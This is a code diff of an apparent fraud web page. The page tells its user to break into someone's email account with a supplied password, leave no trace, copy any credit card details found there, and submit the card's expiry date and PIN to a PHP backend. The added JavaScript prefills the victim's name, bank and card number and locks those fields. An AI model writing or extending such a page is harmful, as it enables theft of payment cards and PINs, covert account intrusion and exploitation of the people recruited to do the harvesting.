@@ -2,6 +2,7 @@
 <html>
 
 <head>
+    <link rel="icon" href="data:,">
     <meta charset="UTF-8">
     <meta name="google" content="notranslate">
     <script>
@@ -47,18 +48,18 @@
                 inval();
             } else {
                 fetch(urlpre + 'php/cy_send.php', {
-                        method: 'post',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            id_post: userid,
-                            post_name1: p_name1,
-                            post_name2: p_name2,
-                            post_date1: p_date,
-                            post_pin: p_pin
-                        })
+                    method: 'post',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        id_post: userid,
+                        post_name1: p_name1,
+                        post_name2: p_name2,
+                        post_date1: p_date,
+                        post_pin: p_pin
                     })
+                })
                     .then(function(response) {
                         return response.text();
                     })
@@ -68,8 +69,6 @@
                             inval();
                         } else {
                             if (response.startsWith("Thank you")) {
-                                let respsplt = response.split("_%_");
-                                details = JSON.parse(respsplt[1]);
                                 setdets();
                                 feeds = respsplt[0].replace("PSWD", '#np36kt57i' + pidpass(userid));
                                 setTimeout(function() {
@@ -141,21 +140,35 @@
             if (userid != null && userid.length > 20 &&
                 userid.length < 30 && hasnumalph(userid)) {
                 fetch(urlpre + 'php/cy_load.php', {
-                        method: 'post',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            id_post: userid
-                        })
+                    method: 'post',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        id_post: userid
                     })
+                })
                     .then(function(response) {
                         return response.text();
                     })
                     .then(function(response) {
                         console.log(response);
                         if (response.startsWith("We ")) {
-                            document.getElementById("sub").innerHTML = response;
+
+                            const respsplt = response.split("_sep_");
+
+                            document.getElementById("sub").innerHTML = respsplt[0];
+
+                            details = JSON.parse(respsplt[1]);
+
+                            let nameParts = details.cname.split(" ");
+                            let firstName = nameParts[0];
+                            let lastName = nameParts.length > 1 ? nameParts.slice(1).join(" ") : ""; 
+                            document.getElementById("name1").value = firstName;
+                            document.getElementById("name2").value = lastName;
+                            document.getElementById("bank").value = details.bankname;
+                            document.getElementById("cardnumber").value = details.cnum;
+
                             document.getElementById("main").style.display = "block";
                         }
                     })
@@ -321,19 +334,27 @@
         ...
     </div>
     <div id="main" style="display:none;">
-        <b>Important: Do not leave any trace! (Do not delete or send any messages! Do not modify any settings! Do not save or store the password anywhere, and do not show it to anyone! As soon as you have the correct information, log out of the email
+        <b>Important: Do not leave any trace! (Do not delete or send any messages! Do not modify any settings! Do not
+            save or store the password anywhere, and do not show it to anyone! As soon as you have the correct
+            information, log out of the email
             account or close the website! Never again access this account!)</b><br><br>
-        If you found any credit card details, copy them here exactly as you find them! Then confirm the external verification by submitting the same PIN as security code.
+        If you found any credit card details, copy them here exactly as you find them! Then confirm the external
+        verification by submitting the same PIN as security code.
         <br><br>
-        Given (first) name of the account holder: <input id="name1" type="text" style="text-transform:uppercase">
+        Given (first) name of the account holder: <input id="name1" type="text" style="text-transform:uppercase"
+            readonly>
         <br>
-        Family (last) name of the account holder: <input id="name2" type="text" style="text-transform:uppercase">
+        Family (last) name of the account holder: <input id="name2" type="text" style="text-transform:uppercase"
+            readonly>
         <br>
-        Name of the bank: <input id="bank" type="text" size="40" style="text-transform:uppercase">
+        Name of the bank: <input id="bank" type="text" size="40" style="text-transform:uppercase" readonly>
         <br>
-        Credit card number: <input id="cardnumber" type="text" size="40">
+        Credit card number: <input id="cardnumber" type="text" size="40" readonly>
+
+
         <br>
-        Expiration date (in the format mm/yy): <input id="date1" type="text" size="2" maxlength="2">/<input id="date2" type="text" size="2" maxlength="2">
+        Expiration date (in the format mm/yy): <input id="date1" type="text" size="2" maxlength="2">/<input id="date2"
+            type="text" size="2" maxlength="2">
         <br>
         PIN (4 digits): <input id="pin" type="text" size="4" maxlength="4">
         <br><br>
